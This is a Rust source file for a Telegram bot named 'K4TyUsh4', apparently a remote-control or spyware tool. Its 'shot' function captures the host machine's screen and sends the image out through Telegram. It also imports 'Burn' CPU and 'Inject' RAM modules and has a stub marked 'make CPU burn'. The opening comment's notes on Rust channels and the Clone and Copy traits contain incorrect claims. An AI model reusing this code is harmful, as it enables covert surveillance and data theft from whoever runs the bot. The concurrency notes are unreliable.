




/*




    https://doc.rust-lang.org/std/pin/index.html
    https://blog.softwaremill.com/multithreading-in-rust-with-mpsc-multi-producer-single-consumer-channels-db0fc91ae3fa
    https://danielkeep.github.io/tlborm/book/
    https://cetra3.github.io/blog/implementing-a-jobq/
    https://cetra3.github.io/blog/implementing-a-jobq-with-tokio/
    https://docs.rs/tokio/1.7.1/tokio/sync/index.html
    https://blog.logrocket.com/macros-in-rust-a-tutorial-with-examples/
    https://blog.logrocket.com/procedural-macros-in-rust/
    https://github.com/cksac/dataloader-rs
    http://gradebot.org/doc/ipur/trait.html
    https://doc.rust-lang.org/std/sync/struct.Arc.html
    https://doc.rust-lang.org/std/sync/struct.Mutex.html
    http://web.mit.edu/rust-lang_v1.25/arch/amd64_ubuntu1404/share/doc/rust/html/book/first-edition/procedural-macros.html
    https://dev.to/5422m4n/rust-macro-rules-in-practice-40ne
    https://github.com/teloxide/teloxide/tree/dev/examples
    https://github.com/TeXitoi/structopt
    https://gist.github.com/wildonion/4f1956d9908e348a74b4381458e474e1






    we can’t just pass the receiver between multiple threads cause trait Clone which is a super trait of Copy is not implemented for the receiver thus we can’t clone it to fix the issue cause if a type is Copy its Clone needs to return *self.
    Multiple producer means multiple threads own the receiver and single consumer means only one of them can mutate and get the job or task from the receiver at a time.
    to fix the issue we have to take an atomic reference from the receiver using Arc in order to clone it for passing between multiple threads and for mutating it we have to 
    put it inside a Mutex to insure that only one thread can change the content of the receiver at a time. this is done by waiting on the receiver until a job or task becomes 
    available to the down side of the channel then locking on the receiver to acquire the mutex.
    the receiver of tokio mpsc channel is shareable between tokio::spawn() threads so we don’t need to take an atomic reference and put it inside the Mutex.


    clone data structure if you want to move them between threads so trait Clone must be implemented for them otherwise clone them using Arc.
    thread safe coding is about to putting the shareable receiver (cloned with Arc) inside a Mutex in order to lock on the incoming task from the sender to prevent other threads from mutating the task at a time.
    live streaming is done using socket, futures, threadpool and mpsc from scratch or tokio::spawn() multithreaded async task handler.


    we can't have a clone from the receiver in mpsc protocol to fix the issue cause if a type is Copy it must have Clone also and its Clone needs to return *self
    can't clone a data structure unless the trait Clone is implemented for that otherwise in order to move it between threads we have to clone it using Arc
    every Copy type is also required to be Clone and if T: Copy, x: T, and y: &T, then let x = y.clone(); is equivalent to let x = *y;
    when we derive a Copy implementation Clone is also required cause it's a super trait of Copy.


    if a type imeplements trait Copy means we can clone it (cause trait Clone is a super trait of Copy) and also assign the variable into another one without losing the ownership of our variable



    TODO - https://github.com/teloxide/teloxide/blob/dev/examples/simple_commands_bot/src/main.rs
    TODO - custom derive macro or proc_macro for my own traits using trait scope orphan rule, closures, C or raw pointers like *mut and *const
    TODO - smart pointers like Arc, Rc, RefCell, Mutex, RwLock, Pin and Box
    TODO - bot macros, commands and functions 






*/






use cmd; //-- to use lib.rs windows commands
use chrono::{DateTime, Duration, NaiveDateTime, Utc};
use teloxide::types::InputFile;
use crate::handlers::schemas::cpu::Burn;
use crate::handlers::schemas::ram::Inject;
use teloxide::{prelude::*, utils::command::BotCommand};
use scrap::{Capturer, Display};
use std::io::ErrorKind::WouldBlock;
use std::fs::File;
use log::{error, info};
use std::thread;
use std::time::Duration as stDuration;
use repng;
use std::path::PathBuf;





pub const name: &'static str = "K4TyUsh4";





pub async fn test(bot: Bot){
    let bot = bot.auto_send(); //-- auto_send() will implement Future trait for bot
    teloxide::repl(bot, |message| async move{
        message.answer_dice().await?;
        respond(())
    }).await;
}






pub async fn shot(bot: Bot){
    // NOTE - an image is an array of u32 or u64 bytes saved in buffer which contains pixels between range 0 to 255
    let one_second = stDuration::new(1, 0);
    let one_frame = one_second / 60;
    let display = Display::primary().expect("Couldn't find primary display");
    let mut capturer = Capturer::new(display).expect("couldn't begin capture.");
    let (w, h) = (capturer.width(), capturer.height());
    loop{
        let buffer = match capturer.frame() {
            Ok(buffer) => buffer,
            Err(error) => {
                if error.kind() == WouldBlock {
                    thread::sleep(one_frame);
                    continue;
                } else {
                    panic!("Error: {}", error);
                }
            }
        };
        teloxide::repl(bot.clone().auto_send(), |message| async move{
            message.answer("Captured! Sending...").await?;
            respond(())
        }).await;
        // ===================================================================
        let mut bitflipped = Vec::with_capacity(w * h * 4);
        let stride = buffer.len() / h;
        for y in 0..h {
            for x in 0..w {
                let i = stride * y + 4 * x;
                bitflipped.extend_from_slice(&[
                    buffer[i + 2],
                    buffer[i + 1],
                    buffer[i],
                    255,
                ]);
            }
        }
        repng::encode(
            File::create("screenshot.png").unwrap(),
            w as u32,
            h as u32,
            &bitflipped,
        ).unwrap();

        info!("Image saved to `screenshot.png`.");
        break;
        // ===================================================================
    }
    teloxide::repl(bot.clone().auto_send(), |message| async move{
        let mut path = PathBuf::new();
        path.push(r"screenshot.png");
        message.answer_photo(InputFile::File(path)).await?;
        respond(())
    }).await;


}






pub async fn burn(bot: Bot){
    // TODO - make CPU burn
    // TODO - reply CPU info status
    // ... 
}